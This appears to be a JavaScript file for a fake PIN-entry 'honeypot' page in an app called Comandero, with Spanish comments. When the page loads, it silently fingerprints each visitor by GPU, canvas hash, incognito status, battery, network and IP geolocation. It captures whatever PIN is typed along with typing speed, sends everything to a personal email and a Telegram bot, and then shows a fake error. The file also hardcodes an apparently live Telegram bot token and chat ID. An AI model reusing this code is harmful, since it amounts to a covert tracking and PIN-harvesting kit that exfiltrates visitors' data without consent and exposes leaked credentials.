// ============================================================================
// HONEYPOT / TRAMPA DE SEGURIDAD AVANZADA - COMANDERO VF
// ============================================================================

const DEST_EMAIL = 'jongt23@gmail.com';
const TELEGRAM_BOT_TOKEN = '8650497450:AAFB-QkgD8WmrlJsG0EhvMF0wICrECwPS-8';
const TELEGRAM_CHAT_ID   = '32759013';

let pinBuffer = '';
let pinTimestamps = [];
let datosDispositivo = {};
let ipData = {};

// ── 1. EXTRACCIÓN AVANZADA DE HUELLA DIGITAL (FINGERPRINTING) ──────────────────

// A. Modelo exacto de GPU / Tarjeta Gráfica (revela modelo exacto de teléfono/PC)
function obtenerGPU() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (!debugInfo) return { vendor: 'N/A', renderer: 'N/A' };
    return {
      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
    };
  } catch (_) {
    return { vendor: 'N/A', renderer: 'N/A' };
  }
}

// B. Canvas Fingerprint (Identificador único de hardware)
function obtenerCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 200;
    canvas.height = 50;
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px "Arial"';
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Comandero, 2.7!', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Comandero, 2.7!', 4, 17);
    const dataURI = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURI.length; i++) {
      hash = ((hash << 5) - hash) + dataURI.charCodeAt(i);
      hash |= 0;
    }
    return 'FP-' + Math.abs(hash).toString(16).toUpperCase();
  } catch (_) {
    return 'N/A';
  }
}

// C. Detección de Modo Incógnito / Navegación Privada
async function detectarModoIncognito() {
  try {
    if ('storage' in navigator && 'estimate' in navigator.storage) {
      const { quota } = await navigator.storage.estimate();
      // En modo privado la cuota suele ser muy reducida (< 120MB en Chrome o restringida)
      if (quota && quota < 120000000) return 'Probable modo Incógnito';
    }
    return 'Navegación normal';
  } catch (_) {
    return 'Desconocido';
  }
}

// D. Historial de accesos acumulados en este navegador
function gestionarContadorVisitas() {
  try {
    let visitas = parseInt(localStorage.getItem('_cmd_v_count') || '0') + 1;
    localStorage.setItem('_cmd_v_count', visitas.toString());
    
    let primeraVez = localStorage.getItem('_cmd_first_seen');
    if (!primeraVez) {
      primeraVez = new Date().toLocaleString('es-ES');
      localStorage.setItem('_cmd_first_seen', primeraVez);
    }
    return { visitasTotales: visitas, primeraVisita: primeraVez };
  } catch (_) {
    return { visitasTotales: 'Cookies/Storage bloqueado', primeraVisita: 'N/A' };
  }
}

// ── 2. RECOPILACIÓN SILENCIOSA AL CARGAR LA PÁGINA ────────────────────────────
async function recopilarDatosIniciales() {
  try {
    const gpu = obtenerGPU();
    const fingerprint = obtenerCanvasFingerprint();
    const modoIncognito = await detectarModoIncognito();
    const historial = gestionarContadorVisitas();

    // Modelo comercial exacto si el navegador lo soporta (Client Hints)
    let modeloComercial = 'N/A';
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      try {
        const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
        if (hints.model) modeloComercial = `${hints.model} (${hints.platform} ${hints.platformVersion || ''})`;
      } catch (_) {}
    }

    datosDispositivo = {
      modeloComercial,
      gpuRenderer: gpu.renderer,
      gpuVendor: gpu.vendor,
      canvasFingerprint: fingerprint,
      modoIncognito,
      visitasRegistradas: `${historial.visitasTotales} (Primera vez: ${historial.primeraVisita})`,
      userAgent: navigator.userAgent,
      platform: navigator.platform || 'Desconocida',
      language: navigator.language || (navigator.languages && navigator.languages[0]) || 'Desconocido',
      languages: (navigator.languages || []).join(', '),
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconocida',
      screenResolution: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1}, Color: ${window.screen.colorDepth}-bit)`,
      viewportSize: `${window.innerWidth}x${window.innerHeight}`,
      touchPoints: navigator.maxTouchPoints || 0,
      coresCPU: navigator.hardwareConcurrency || 'N/A',
      ramGB: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
      urlAcceso: window.location.href,
      referrer: document.referrer || 'Acceso directo',
      fechaApertura: new Date().toLocaleString('es-ES', { timeZoneName: 'short' }),
      timestampUTC: new Date().toISOString()
    };

    // Conexión de red estimada
    if (navigator.connection) {
      datosDispositivo.conexionTipo = navigator.connection.effectiveType || 'N/A';
      datosDispositivo.conexionDownlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'N/A';
      datosDispositivo.conexionRtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'N/A';
    }

    // Batería (si el navegador lo soporta)
    if (navigator.getBattery) {
      try {
        const batt = await navigator.getBattery();
        datosDispositivo.bateriaNivel = `${Math.round(batt.level * 100)}%`;
        datosDispositivo.bateriaCargando = batt.charging ? 'Sí' : 'No';
      } catch (_) {}
    }

    // Obtener IP pública y geolocalización por IP
    await obtenerGeoIP();
  } catch (err) {
    console.error("Init honeypot error:", err);
  }
}

async function obtenerGeoIP() {
  try {
    const res = await fetch('https://ipwho.is/', { cache: 'no-store' });
    const data = await res.json();
    if (data && data.success !== false) {
      ipData = {
        ip: data.ip,
        tipo: data.type,
        ciudad: data.city,
        region: data.region,
        pais: data.country,
        codigoPais: data.country_code,
        codigoPostal: data.postal,
        latitud: data.latitude,
        longitud: data.longitude,
        isp: data.connection ? data.connection.isp : (data.isp || 'N/A'),
        org: data.connection ? data.connection.org : 'N/A',
        dominio: data.connection ? data.connection.domain : 'N/A',
        zonaHoraria: data.timezone ? data.timezone.id : 'N/A'
      };
      return;
    }
  } catch (_) {}

  // Fallback secundario si el primero falla
  try {
    const res2 = await fetch('https://api.ipify.org?format=json');
    const data2 = await res2.json();
    ipData = { ip: data2.ip, proveedor: 'ipify fallback' };
  } catch (_) {}
}

// ── 3. ENVÍO DE ALERTAS ───────────────────────────────────────────────────────
async function enviarAlerta(pinProbado) {
  const fechaActual = new Date().toLocaleString('es-ES', { timeZoneName: 'short' });
  const ipTexto = ipData.ip || 'No detectada';
  const ubicacionTexto = (ipData.ciudad ? `${ipData.ciudad}, ${ipData.region} (${ipData.pais})` : 'Desconocida');
  const mapaUrl = (ipData.latitud && ipData.longitud) ? `https://www.google.com/maps?q=${ipData.latitud},${ipData.longitud}` : 'N/A';

  // Calcular cadencia y velocidad de tecleo del PIN
  let velocidadTecleo = 'N/A';
  if (pinTimestamps.length >= 2) {
    const totalMs = pinTimestamps[pinTimestamps.length - 1] - pinTimestamps[0];
    velocidadTecleo = `${totalMs} ms en teclear los 4 dígitos`;
  }

  const cuerpoInforme = {
    _subject: `🚨 ALERTA INTRUSO COMANDERO - PIN: [${pinProbado}] - IP: ${ipTexto}`,
    _template: 'table',
    _captcha: 'false',
    PIN_PROBADO: pinProbado,
    FECHA_HORA: fechaActual,
    IP_PUBLICA: ipTexto,
    UBICACION_APROX: ubicacionTexto,
    ISP_OPERADOR: ipData.isp || 'N/A',
    COORDENADAS_MAPA: mapaUrl,
    MODELO_DISPOSITIVO: datosDispositivo.modeloComercial !== 'N/A' ? datosDispositivo.modeloComercial : datosDispositivo.platform,
    CHIP_GRAFICA_GPU: datosDispositivo.gpuRenderer || 'N/A',
    HUELLA_HARDWARE_ID: datosDispositivo.canvasFingerprint || 'N/A',
    MODO_NAVEGACION: datosDispositivo.modoIncognito || 'N/A',
    HISTORIAL_VISITAS_LOCALES: datosDispositivo.visitasRegistradas || 'N/A',
    VELOCIDAD_TECLEO: velocidadTecleo,
    RESOLUCION_PANTALLA: datosDispositivo.screenResolution || 'N/A',
    PANTALLA_TACTIL: datosDispositivo.touchPoints > 0 ? `Sí (${datosDispositivo.touchPoints} puntos táctiles)` : 'No / Ratón',
    BATERIA: datosDispositivo.bateriaNivel ? `${datosDispositivo.bateriaNivel} (Cargando: ${datosDispositivo.bateriaCargando})` : 'N/A',
    CONEXION_RED: datosDispositivo.conexionTipo || 'N/A',
    IDIOMA_Y_ZONA: `${datosDispositivo.language} | ${datosDispositivo.timeZone}`,
    USER_AGENT_COMPLETO: datosDispositivo.userAgent || 'N/A',
    URL_ORIGEN: datosDispositivo.urlAcceso || 'N/A'
  };

  // 1. Enviar por Email mediante FormSubmit (AJAX JSON)
  try {
    await fetch(`https://formsubmit.co/ajax/${DEST_EMAIL}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify(cuerpoInforme)
    });
  } catch (e) {
    console.error("Error enviando email honeypot:", e);
  }

  // 2. Enviar por Telegram Bot en tiempo real
  if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      const modeloStr = datosDispositivo.modeloComercial !== 'N/A' 
        ? datosDispositivo.modeloComercial 
        : datosDispositivo.platform;

      const tactilStr = datosDispositivo.touchPoints > 0 ? `Sí (${datosDispositivo.touchPoints} puntos)` : 'No (Ratón)';
      const redStr = datosDispositivo.conexionTipo 
        ? `${datosDispositivo.conexionTipo.toUpperCase()} (${datosDispositivo.conexionDownlink || 'N/A'})` 
        : 'N/A';

      const msgTelegram = `🚨 <b>¡INTRUSO CAZADO EN COMANDERO!</b>\n\n` +
        `🔑 <b>PIN Probado:</b> <code>${pinProbado}</code>\n` +
        `⏱ <b>Velocidad Tecleo:</b> ${velocidadTecleo}\n\n` +
        `🌐 <b>IP Pública:</b> <code>${ipTexto}</code>\n` +
        `📍 <b>Ubicación:</b> ${ubicacionTexto}\n` +
        `🏢 <b>ISP / Compañía:</b> ${ipData.isp || 'N/A'}\n` +
        `🗺 <b>Google Maps:</b> ${mapaUrl}\n\n` +
        `📱 <b>Dispositivo:</b> ${modeloStr}\n` +
        `🖥 <b>Pantalla:</b> ${datosDispositivo.screenResolution || 'N/A'}\n` +
        `👆 <b>Táctil:</b> ${tactilStr}\n` +
        `🎮 <b>GPU / Gráfica:</b> <code>${datosDispositivo.gpuRenderer || 'N/A'}</code>\n` +
        `🧬 <b>Huella Hardware:</b> <code>${datosDispositivo.canvasFingerprint}</code>\n` +
        `🕵️ <b>Navegación:</b> ${datosDispositivo.modoIncognito}\n` +
        `👁 <b>Visitas del terminal:</b> ${datosDispositivo.visitasRegistradas}\n` +
        `🔋 <b>Batería:</b> ${datosDispositivo.bateriaNivel || 'N/A'} (Cargando: ${datosDispositivo.bateriaCargando || 'N/A'})\n` +
        `📶 <b>Conexión:</b> ${redStr}\n` +
        `🧠 <b>Hardware:</b> ${datosDispositivo.coresCPU} núcleos CPU | ${datosDispositivo.ramGB} RAM\n` +
        `🌐 <b>Idioma y Zona:</b> ${datosDispositivo.language} | ${datosDispositivo.timeZone}\n` +
        `🧭 <b>Navegador:</b> <code>${datosDispositivo.userAgent || 'N/A'}</code>\n\n` +
        `⏰ <b>Fecha:</b> ${fechaActual}`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msgTelegram,
          parse_mode: 'HTML'
        })
      });
    } catch (e) {
      console.error("Error enviando Telegram:", e);
    }
  }
}

// ── 4. MANEJO DEL TECLADO PIN Y SIMULACIÓN ─────────────────────────────────────
function updatePinDots(error) {
  for (let i = 0; i < 4; i++) {
    const dot = document.getElementById('pd' + i);
    if (dot) {
      dot.className = 'pin-dot' + (i < pinBuffer.length ? (error ? ' error' : ' filled') : '');
    }
  }
}

window.pinKey = async d => {
  if (pinBuffer.length >= 4) return;
  pinBuffer += d;
  pinTimestamps.push(Date.now());
  updatePinDots(false);

  if (pinBuffer.length === 4) {
    await procesarIntentoPin(pinBuffer);
  }
};

window.pinDel = () => {
  pinBuffer = pinBuffer.slice(0, -1);
  pinTimestamps.pop();
  updatePinDots(false);
  const err = document.getElementById('pin-error');
  if (err) err.style.display = 'none';
};

async function procesarIntentoPin(pin) {
  const sub = document.getElementById('pin-sub');
  const err = document.getElementById('pin-error');
  const box = document.getElementById('pin-box');

  if (sub) sub.textContent = 'Conectando con el servidor...';

  // Enviar alerta con todos los datos recopilados
  enviarAlerta(pin);

  // Simular pequeña espera de red realista (1.2 segundos)
  await new Promise(r => setTimeout(r, 1200));

  // Simular fallo sin levantar sospechas
  updatePinDots(true);
  if (box) {
    box.classList.add('shake');
    setTimeout(() => box.classList.remove('shake'), 400);
  }
  if (sub) sub.textContent = 'Introduce tu PIN';
  if (err) {
    err.textContent = 'PIN incorrecto';
    err.style.display = 'block';
  }

  setTimeout(() => {
    pinBuffer = '';
    pinTimestamps = [];
    updatePinDots(false);
  }, 1000);
}

// Asignar eventos de botones
document.addEventListener('DOMContentLoaded', () => {
  recopilarDatosIniciales();

  const pad = document.getElementById('pin-pad');
  if (pad) {
    pad.addEventListener('click', e => {
      const btn = e.target.closest('.pin-key');
      if (!btn) return;
      const k = btn.dataset.k;
      if (k === 'del') window.pinDel();
      else if (k && k !== '') window.pinKey(k);
    });
  }
});
